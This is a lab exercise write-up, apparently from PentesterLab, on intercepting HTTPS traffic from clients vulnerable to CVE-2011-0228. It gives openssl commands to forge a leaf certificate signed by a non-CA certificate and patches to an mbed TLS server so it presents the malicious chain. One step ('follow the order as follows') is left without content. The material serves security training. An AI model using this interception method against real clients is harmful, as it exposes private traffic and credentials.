
# CVE-2011-0228

* This exercise covers how to intercept an HTTPs connection..

## Introduction

* This course details how to perform a Person-in-the-Middle attack against a client performing an HTTP connection over TLS. 

* The client properly validates the server's certificate and hostname. However the underlying TLS stack is vulnerable to `CVE-2011-0228`. 

* This exercise will show you how you can exploit this vulnerability.

## The exercise

* Like with the first exercise, you have control over the client's DNS resolution. Using this you will be able to lie and tell the client to go to your server instead of the legitimate one. 

* If you manage to get access to the request's content, you finished this exercise.

* This exercise is divided in two steps:

    * Setting up a DNS server like you did in the first exercise of this badge.

    * Setting up a TCP server with TLS support.

### Setting up a DNS server

* For this part, you can just follow the steps highlighted in the first exercise on MITM. The only thing that changed is the hostname used by the client.

### x509 verification and chain of trust

* As part of a request sent over TLS, before sending the request, the client will make sure that:

    * The certificate is valid.
	
    * The certificate matches the hostname it's visiting.

* Validating a certificate's validity can be divided into multiple steps:

    * Ensuring the current certificate did not expired and is valid for the current time (the issue date is not in the future)..

    * Ensuring that the current certificate is signed by a valid certificate authority (`CA`).

    * Ensuring that the parent certificate is a certificate authority.

* These checks are performed for all certificates in the certificate chain to established a chain of trust. 

* The first certificate (`root CA`) is embedded in your browser/system and is already trusted. If all certificates in the chain can be validated, the leaf certificate (last certificate in the chain) can be trusted.

### CVE-2011-0228

* `CVE-2011-0228` impacted `iOS` before `4.2.10` and `4.3.x` before `4.3.5`. 

* This issue is located in the last step of the verification: `ensuring that the parent certificate is a certificate authority`. 

* TLS stack impacted by `CVE-2011-0228` did not verify that constraint. This allows an attacker to generate a malicious `valid` certificate for `example.org` using a valid certificate even if he is not a certificate authority.

### Exploiting this issue

* To exploit this issue, two steps are required:

    * Generate a malicious certificate.

    * Setting up a TLS server.

#### Generating the malicious certificate

* To start, you will need a valid certificate and its private key. You can get one from attackments.

* If you inspect the certificate, you can see that it's not a certificate authority:
```bash
$ openssl x509 -in hackingwithpentesterlab.link.crt -text
[...]
        X509v3 extensions:
[...]
            X509v3 Basic Constraints: critical
                CA:FALSE
[...]
```

* However, nothing prevents you from creating your own certificate and signing it with the private key. 

* TLS clients (unless they are vulnerable to `CVE-2011-0228`) will just reject this certificate as one of your certificates is not a certificate authority.

* To do this, you can create a private key using:
```bash
$ openssl genrsa -out mitm4.pentesterlab.com.key 2048
```
* and a certificate signing request (`CSR`) for your future certificate:
```bash
% openssl req -new -sha256 -key mitm4.pentesterlab.com.key -out mitm4.pentesterlab.com.csr

You are about to be asked to enter information that will be incorporated into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:AU
State or Province Name (full name) [Some-State]:Victoria
Locality Name (eg, city) []:Melbourne
Organization Name (eg, company) [Internet Widgits Pty Ltd]:PentesterLab
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:mitm4.pentesterlab.com
Email Address []:

Please enter the following 'extra' attributes
to be sent with your certificate request
A challenge password []:
An optional company name []:
```
* You don't need to setup a password and you can set any values for these fields aside from the `Common Name` (e.g. server `FQDN` or YOUR name) that needs to perfectly match the `hostname` accessed by the vulnerable client.

* To get from the `CSR` to a certificate, you will need to setup some files and directory to get `openssl` to work:
```bash
% mkdir -p demoCA/private demoCA/newcerts
% cp hackingwithpentesterlab.link.key demoCA/private/cakey.pem
% cp hackingwithpentesterlab.link.crt demoCA/cacert.pem
% touch demoCA/index.txt
% echo 01 > demoCA/serial
```
* After getting the openssl configuration file `openssl.cnf`.

* You can sign the `CSR` with the `hackingwithpentesterlab.link.key` 's key:
```bash
% openssl ca   -config openssl.cnf -verbose  -out mitm4.pentesterlab.com.crt -infiles mitm4.pentesterlab.com.csr
[...]
Certificate is to be certified until Feb  2 21:20:52 2017 GMT (365 days)
Sign the certificate? [y/n]:y


1 out of 1 certificate requests certified, commit? [y/n]y
Write out database with 1 new entries
writing new certificates
writing ./demoCA/newcerts/01.pem
Data Base Updated
```
* Now, you will just need to concatenate the certificates to create your malicious chain (`myca.pem`).

### Setting up the malicious server

* The last step to pull out this attack is to set up a server that will present our malicious certificate's chain. Unfortunately, `OpenSSL` is a bit too smart on this and will not present an invalid chain.

* To solve this issue, you can use two methods:

    * Write a minimal TLS stack (`https://github.com/hubert3/iSniff`).

    * Use an implementation that will load and present the chain even if it's invalid.

* We are going to go with `option #2` as it's a bit easier to build. To do this, we can use `mbed TLS` (formerly known as `PolarSSL`). 

* We just need to create a little TLS server that will listen on port `443` and print any data it receives.

* `mbed TLS` comes with some code examples. We can use `programs/ssl/ssl_server.c` and modify it to get what we want.

* First, let's make sure it compiles (on Debian):
```bash
$ wget https://tls.mbed.org/download/mbedtls-2.2.1-apache.tgz
$ tar -zxf mbedtls-2.2.1-apache.tgz
$ cd mbedtls-2.2.1
$ apt-get update && apt-get upgrade #hygiene
$ apt-get install build-essential
$ make
```
* Now that it's compiled we can start modifying the file `programs/ssl/ssl_server.c` to change the following:

    * Load the certificates' chain from a file.

    * Load the private key from a file.

* We could manage to get the same result by modifying the constant in `include/mbedtls/certs.h` but getting the certificates and key from a file will make things easier to test.

* To load the certificate chain from a file, you just need to change (around line 134):
```c
ret = mbedtls_x509_crt_parse( &srvcert, (const unsigned char *) mbedtls_test_srv_crt, mbedtls_test_srv_crt_len );
```
* by:
```c
ret =  mbedtls_x509_crt_parse_file(&srvcert, "/root/myca.pem");
```
* To load the key from a file, you just need to change (around line 150):
```c
ret =  mbedtls_pk_parse_key( &pkey, (const unsigned char *) mbedtls_test_srv_key, mbedtls_test_srv_key_len, NULL, 0 );
```
* by:
```c
ret =  mbedtls_pk_parse_keyfile(&pkey, "/root/mitm4.pentesterlab.com.key",NULL);
```
* Finally, you just need to change the port used by the server from `4433` to `443`. The port is set when the code calls the function `mbedtls_net_bind`.

* Once you performed both modification, you need to recompile the code:
```bash
$ make
```
* Concating certifciate
```bash
$ cat GandiStandardSSLCA2.pem hackingwithpentesterlab.link.crt mitm4.pentesterlab.com.crt > myca.pem

```
* above will cause the following error ` STDERR: 2019/12/03 08:12:13 client: x509: certificate is valid for Gandi Standard SSL CA 2, not mitm4.pentesterlab.com exit status 1`

* you need to follow the order as follows



* You should now be able to present your malicious chain to legitimate clients by running the server:
```bash
$ ./programs/ssl/ssl_server
```

## Conclusion

* This exercise showed you how you can intercept a TLS connection from a client that is vulnerable to `CVE-2011-0228`. 

* Once you know how to setup your own TLS server programmatically it's really easy to exploit this type of issues. 


* You can access this exercise using the following URL: http://ptl-cd6f6d08-086bbc6c.libcurl.so/ 

* you will get the following request
```
GET / HTTP/1.1
Host: mitm4.pentesterlab.com
PTL_KEY: 80c8b7d1-1e4c-4fa8-8390-939b16edb127
Connection: Close

  > Write to client: 150 bytes written

  HTTP/1.0 200 OK
  Content-Type: text/html

  <h2>mbed TLS Test Server</h2>
  <p>Successful connection using: TLS-ECDHE-RSA-WITH-AES-256-GCM-SHA384</p>

    . Closing the connection... ok

```
